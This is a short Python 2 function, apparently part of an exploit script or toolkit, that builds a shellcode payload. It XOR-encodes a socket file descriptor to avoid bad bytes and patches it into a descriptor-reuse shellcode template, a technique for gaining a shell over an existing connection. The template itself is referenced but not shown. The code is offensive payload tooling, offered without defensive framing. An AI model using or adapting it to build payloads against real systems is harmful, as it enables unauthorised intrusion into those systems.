
def reusefd(fd):
	import struct
	fd_string = struct.pack("<I", int(fd))
	fd_enc = ""
	fd_key = ""
	for m in fd_string:
		k = 0xFF
		if(ord(m) == k):
			k = 0xEE
		fd_key += chr(k)
		fd_enc += chr(ord(m) ^ k)
	return reusefd_shellcode.replace("\xbf\x14\x11\x11\x11\x81\xf7\x11\x11\x11\x11", "\xbf" + fd_enc + "\x81\xf7" + fd_key)

